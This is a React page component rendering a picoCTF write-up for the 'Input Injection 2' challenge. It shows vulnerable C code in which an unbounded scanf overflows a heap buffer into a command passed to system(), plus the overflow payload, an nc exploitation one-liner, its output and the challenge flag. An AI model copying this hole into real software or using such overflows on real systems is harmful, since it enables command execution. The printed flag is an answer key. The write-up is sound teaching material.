import Image from 'next/image'

export default function InputInjection2() {
  return (
    <div className="space-y-8">
      {/* Header Section */}
      <div className="bg-gradient-to-r from-purple-50 to-indigo-100 rounded-2xl p-8 border-l-4 border-purple-500">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Input Injection 2</h1>
        <p className="text-xl text-gray-700 leading-relaxed">
          This program greets you and then runs a command. But can you take control of what command it executes?
        </p>
      </div>

      {/* Information Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Information Given</h2>
        
        <div className="space-y-6">
          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Description</h3>
            <p className="text-gray-700 leading-relaxed text-lg">
              This program greets you and then runs a command. But can you take control of what command it executes?
            </p>
            <p className="mt-4 text-gray-600">
              Additional details will be available after launching your challenge instance.
            </p>
          </div>

          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Hints</h3>
            <ul className="space-y-2 text-gray-700">
              <li>• Notice how <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">username</code> and <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">shell</code> are both heap-allocated.</li>
              <li>• Offsets often hide in the memory addresses you see at runtime.</li>
              <li>• Try to overwrite what command gets executed.</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Source Code Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Vuln.c Script</h2>
        
        <div className="bg-gray-800 rounded-lg p-6">
          <pre className="text-green-400 font-mono text-sm">
{`#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char *username = malloc(28);
    char *shell = malloc(28);

    printf("username at %p\\n", (void *)username);
    fflush(stdout);

    printf("shell at %p\\n", (void *)shell);
    fflush(stdout);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    fflush(stdout);

    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\\n", username, shell);
    system(shell);
    fflush(stdout);

    return 0;
}`}
          </pre>
        </div>
      </div>

      {/* Vulnerabilities Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Vulnerabilities Identified</h2>
        <div className="space-y-4">
          <div>
            <h3 className="text-xl font-bold text-red-700 mb-2">1. Buffer Overflow in `scanf`</h3>
            <p className="text-gray-700">
              The <code className="bg-red-100 text-red-800 px-2 py-1 rounded font-mono">scanf("%s", username)</code> call doesn't check bounds, 
              allowing us to write beyond the allocated 28-byte buffer.
            </p>
          </div>
          
          <div>
            <h3 className="text-xl font-bold text-red-700 mb-2">2. Adjacent Memory Layout</h3>
            <p className="text-gray-700">
              Both <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">username</code> and <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">shell</code> buffers are allocated on the heap with <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">malloc(28)</code>, 
              making them adjacent in memory.
            </p>
          </div>
          
          <div>
            <h3 className="text-xl font-bold text-red-700 mb-2">3. Command Execution</h3>
            <p className="text-gray-700">
              The program executes <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">system(shell)</code>, giving us a path to arbitrary command execution 
              if we can control the <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">shell</code> buffer.
            </p>
          </div>
        </div>
      </div>

      {/* Payload Section */}
      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 rounded-xl p-8 border border-orange-200">
        <h2 className="text-3xl font-bold text-orange-900 mb-6">Payload</h2>
        <div className="bg-gray-900 rounded-lg p-6 text-green-400 font-mono shadow-2xl">
          <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat&lt;flag.txt</code>
        </div>
        <div className="mt-4 text-gray-700">
          <p className="font-semibold mb-2">This payload:</p>
          <ul className="space-y-1 ml-4">
            <li>• Uses 48 'A's to overflow into the <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">shell</code> buffer</li>
            <li>• Replaces the shell command with <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">cat&lt;flag.txt</code></li>
            <li>• Uses input redirection to avoid spaces</li>
          </ul>
        </div>
      </div>

      {/* Exploitation Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Exploitation</h2>
        <div className="bg-gray-800 rounded-lg p-6">
          <pre className="text-green-400 font-mono text-sm">
{`python3 -c "print('A' * 48 + 'cat<flag.txt')" | nc saffron-estate.picoctf.net 51668`}
          </pre>
        </div>
        
        <div className="mt-6">
          <p className="text-green-300 mb-4"><strong>Output:</strong></p>
          <div className="bg-gray-800 rounded-lg p-6">
            <pre className="text-green-400 font-mono text-sm">
{`username at 0x93342a0
shell at 0x93342d0
Enter username: {"picoCTF{" + "us3rn4m3_2_sh3ll_809f901a" + "}"}Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt. Your shell is cat<flag.txt.`}
            </pre>
          </div>
        </div>
      </div>

      {/* Flag Section */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-8 border-l-4 border-green-500">
        <h2 className="text-3xl font-bold text-green-800 mb-6">Flag</h2>
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-xl font-mono text-xl font-bold shadow-lg">
          {"picoCTF{" + "'{'" + "}"}us3rn4m3_2_sh3ll_809f901a{'}'}
        </div>
      </div>
    </div>
  )
}